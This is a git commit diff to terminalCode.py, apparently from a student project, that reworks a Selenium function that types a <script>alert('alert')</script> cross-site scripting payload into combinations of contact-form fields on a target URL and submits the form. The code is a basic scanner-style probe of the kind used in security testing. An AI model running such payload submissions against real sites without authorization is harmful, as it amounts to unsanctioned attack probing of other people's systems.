0482e1bd2e64fca297cf522f57da9d813c9a43fb
caldwella2 <caldwella2@allegheny.edu>
2022-12-21 16:42:33 -0900

    removed repeated tests

--- terminalCode.py
+++ terminalCode.py
@@ -9,28 +9,7 @@ import os
 def reflectedCrossSite(url):
     results = []
 
-    # name and message==================================================================================WRONG
-    try:
-        options = Options()
-        options.headless = True
-        s = Service("C:/Users/Lex Caldwell/Downloads/chromedriver")
-        driver = webdriver.Chrome(service=s, options=options) # path to chromedriver
-        driver.get(url)
-        # This finds the element and passes in a script
-        driver.find_element(By.NAME, 'your-message').send_keys("Message trial #2")
-        driver.find_element(By.NAME, 'your-name').send_keys("<script>alert('alert')</script>")
-        print("\n\t [+] HTML elements found:\n")
-        # this finds the button
-        button = driver.find_element(By.XPATH, "//input[@type='submit']")
-        # this clicks the button
-        driver.execute_script("arguments[0].click();", button)
-        print("\n\t [+] Button was successfully pressed:\n")
-        driver.quit() # closes the window
-        results.append(True)
-    except:
-        print("\n\t [+] Element does not exist.")
-        results.append(False)
-    # name and message  =================================================================> WRONG
+    # name and message  ==============================================================================
     try:
         options = Options()
         options.headless = True
@@ -51,28 +30,7 @@ def reflectedCrossSite(url):
     except:
         print("\n\t [+] Element does not exist.")
         results.append(False)
-    # name and subject ============================================================================ RIGHT
-    try:
-        options = Options()
-        options.headless = True
-        s = Service("C:/Users/Lex Caldwell/Downloads/chromedriver")
-        driver = webdriver.Chrome(service=s, options=options) # path to chromedriver
-        driver.get(url)
-        # This finds the element and passes in a script
-        driver.find_element(By.NAME, 'your-name').send_keys("<script>alert('alert')</script>")
-        driver.find_element(By.NAME, 'your-subject').send_keys("Message trial #2")
-        print("\n\t [+] HTML elements found:\n")
-        # this finds the button
-        button = driver.find_element(By.XPATH, "//input[@type='submit']")
-        # this clicks the button
-        driver.execute_script("arguments[0].click();", button)
-        print("\n\t [+] Button was successfully pressed:\n")
-        driver.quit() # closes the window
-        results.append(True)
-    except:
-        print("\n\t [+] Element does not exist.")
-        results.append(False)
-    # subject and name ======================================================================================RIGHT (for some reason)
+    # subject and name ======================================================================================
     try:
         options = Options()
         options.headless = True
@@ -93,28 +51,7 @@ def reflectedCrossSite(url):
     except:
         print("\n\t [+] Element does not exist.")
         results.append(False)
-    # name and email =======================================================================================WRONG
-    try:
-        options = Options()
-        options.headless = True
-        s = Service("C:/Users/Lex Caldwell/Downloads/chromedriver")
-        driver = webdriver.Chrome(service=s, options=options) # path to chromedriver
-        driver.get(url)
-        # This finds the element and passes in a script
-        driver.find_element(By.NAME, 'your-name').send_keys("<script>alert('alert')</script>")
-        driver.find_element(By.NAME, 'your-email').send_keys("Message trial #2")
-        print("\n\t [+] HTML elements found:\n")
-        # this finds the button
-        button = driver.find_element(By.XPATH, "//input[@type='submit']")
-        # this clicks the button
-        driver.execute_script("arguments[0].click();", button)
-        print("\n\t [+] Button was successfully pressed:\n")
-        driver.quit() # closes the window
-        results.append(True)
-    except:
-        print("\n\t [+] Element does not exist.")
-        results.append(False)
-    # email and name ===========================================================================================WRONG
+    # email and name ===========================================================================================
     try:
         options = Options()
         options.headless = True
@@ -135,28 +72,7 @@ def reflectedCrossSite(url):
     except:
         print("\n\t [+] Element does not exist.")
         results.append(False)
-    # message and subject ====================================================================================WRONG
-    try:
-        options = Options()
-        options.headless = True
-        s = Service("C:/Users/Lex Caldwell/Downloads/chromedriver")
-        driver = webdriver.Chrome(service=s, options=options) # path to chromedriver
-        driver.get(url)
-        # This finds the element and passes in a script
-        driver.find_element(By.NAME, 'your-message').send_keys("<script>alert('alert')</script>")
-        driver.find_element(By.NAME, 'your-subject').send_keys("Message trial #2")
-        print("\n\t [+] HTML elements found:\n")
-        # this finds the button
-        button = driver.find_element(By.XPATH, "//input[@type='submit']")
-        # this clicks the button
-        driver.execute_script("arguments[0].click();", button)
-        print("\n\t [+] Button was successfully pressed:\n")
-        driver.quit() # closes the window
-        results.append(True)
-    except:
-        print("\n\t [+] Element does not exist.")
-        results.append(False)
-    # subject and message ================================================================================WRONG
+    # subject and message ================================================================================
     try:
         options = Options()
         options.headless = True
@@ -177,28 +93,7 @@ def reflectedCrossSite(url):
     except:
         print("\n\t [+] Element does not exist.")
         results.append(False)
-    # subject and email ====================================================================================WRONG
-    try:
-        options = Options()
-        options.headless = True
-        s = Service("C:/Users/Lex Caldwell/Downloads/chromedriver")
-        driver = webdriver.Chrome(service=s, options=options) # path to chromedriver
-        driver.get(url)
-        # This finds the element and passes in a script
-        driver.find_element(By.NAME, 'your-subject').send_keys("<script>alert('alert')</script>")
-        driver.find_element(By.NAME, 'your-email').send_keys("Message trial #2")
-        print("\n\t [+] HTML elements found:\n")
-        # this finds the button
-        button = driver.find_element(By.XPATH, "//input[@type='submit']")
-        # this clicks the button
-        driver.execute_script("arguments[0].click();", button)
-        print("\n\t [+] Button was successfully pressed:\n")
-        driver.quit() # closes the window
-        results.append(True)
-    except:
-        print("\n\t [+] Element does not exist.")
-        results.append(False)
-    # email and subject ========================================================================================== WRONG
+    # email and subject ==========================================================================================
     try:
         options = Options()
         options.headless = True
@@ -219,7 +114,7 @@ def reflectedCrossSite(url):
     except:
         print("\n\t [+] Element does not exist.")
         results.append(False)
-    # email and message ===================================================================================== WRONG
+    # message and email =================================================================================
     try:
         options = Options()
         options.headless = True
@@ -227,8 +122,8 @@ def reflectedCrossSite(url):
         driver = webdriver.Chrome(service=s, options=options) # path to chromedriver
         driver.get(url)
         # This finds the element and passes in a script
-        driver.find_element(By.NAME, 'your-email').send_keys("<script>alert('alert')</script>")
-        driver.find_element(By.NAME, 'your-message').send_keys("Message trial #2")
+        driver.find_element(By.NAME, 'your-message').send_keys("<script>alert('alert')</script>")
+        driver.find_element(By.NAME, 'your-email').send_keys("Message trial #2")
         print("\n\t [+] HTML elements found:\n")
         # this finds the button
         button = driver.find_element(By.XPATH, "//input[@type='submit']")
@@ -240,7 +135,33 @@ def reflectedCrossSite(url):
     except:
         print("\n\t [+] Element does not exist.")
         results.append(False)
-    # message and email ================================================================================= WRONG
+
+    # three input levels ****************************************************************************************************************************************
+
+    # name and subject and email ============================================================================ 
+    try:
+        options = Options()
+        options.headless = True
+        s = Service("C:/Users/Lex Caldwell/Downloads/chromedriver")
+        driver = webdriver.Chrome(service=s, options=options) # path to chromedriver
+        driver.get(url)
+        # This finds the element and passes in a script
+        driver.find_element(By.NAME, 'your-name').send_keys("<script>alert('alert')</script>")
+        driver.find_element(By.NAME, 'your-subject').send_keys("Message trial #2")
+        driver.find_element(By.NAME, "email-430").send_keys("<script>alert('alert')</script>")
+        print("\n\t [+] HTML elements found:\n")
+        # this finds the button
+        button = driver.find_element(By.XPATH, "//input[@type='submit']")
+        # this clicks the button
+        driver.execute_script("arguments[0].click();", button)
+        print("\n\t [+] Button was successfully pressed:\n")
+        driver.quit() # closes the window
+        results.append(True)
+    except:
+        print("\n\t [+] Element does not exist.")
+        results.append(False)
+    
+    # message and subject and email ============================================================================ 
     try:
         options = Options()
         options.headless = True
@@ -249,7 +170,54 @@ def reflectedCrossSite(url):
         driver.get(url)
         # This finds the element and passes in a script
         driver.find_element(By.NAME, 'your-message').send_keys("<script>alert('alert')</script>")
-        driver.find_element(By.NAME, 'your-email').send_keys("Message trial #2")
+        driver.find_element(By.NAME, 'your-subject').send_keys("Message trial #2")
+        driver.find_element(By.NAME, "email-430").send_keys("<script>alert('alert')</script>")
+        print("\n\t [+] HTML elements found:\n")
+        # this finds the button
+        button = driver.find_element(By.XPATH, "//input[@type='submit']")
+        # this clicks the button
+        driver.execute_script("arguments[0].click();", button)
+        print("\n\t [+] Button was successfully pressed:\n")
+        driver.quit() # closes the window
+        results.append(True)
+    except:
+        print("\n\t [+] Element does not exist.")
+        results.append(False)
+
+    # message and name and email ============================================================================ 
+    try:
+        options = Options()
+        options.headless = True
+        s = Service("C:/Users/Lex Caldwell/Downloads/chromedriver")
+        driver = webdriver.Chrome(service=s, options=options) # path to chromedriver
+        driver.get(url)
+        # This finds the element and passes in a script
+        driver.find_element(By.NAME, 'your-message').send_keys("<script>alert('alert')</script>")
+        driver.find_element(By.NAME, 'your-name').send_keys("Message trial #2")
+        driver.find_element(By.NAME, "email-430").send_keys("<script>alert('alert')</script>")
+        print("\n\t [+] HTML elements found:\n")
+        # this finds the button
+        button = driver.find_element(By.XPATH, "//input[@type='submit']")
+        # this clicks the button
+        driver.execute_script("arguments[0].click();", button)
+        print("\n\t [+] Button was successfully pressed:\n")
+        driver.quit() # closes the window
+        results.append(True)
+    except:
+        print("\n\t [+] Element does not exist.")
+        results.append(False)
+
+    # message and subject and name ============================================================================ 
+    try:
+        options = Options()
+        options.headless = True
+        s = Service("C:/Users/Lex Caldwell/Downloads/chromedriver")
+        driver = webdriver.Chrome(service=s, options=options) # path to chromedriver
+        driver.get(url)
+        # This finds the element and passes in a script
+        driver.find_element(By.NAME, 'your-message').send_keys("<script>alert('alert')</script>")
+        driver.find_element(By.NAME, 'your-subject').send_keys("Message trial #2")
+        driver.find_element(By.NAME, "name").send_keys("<script>alert('alert')</script>")
         print("\n\t [+] HTML elements found:\n")
         # this finds the button
         button = driver.find_element(By.XPATH, "//input[@type='submit']")
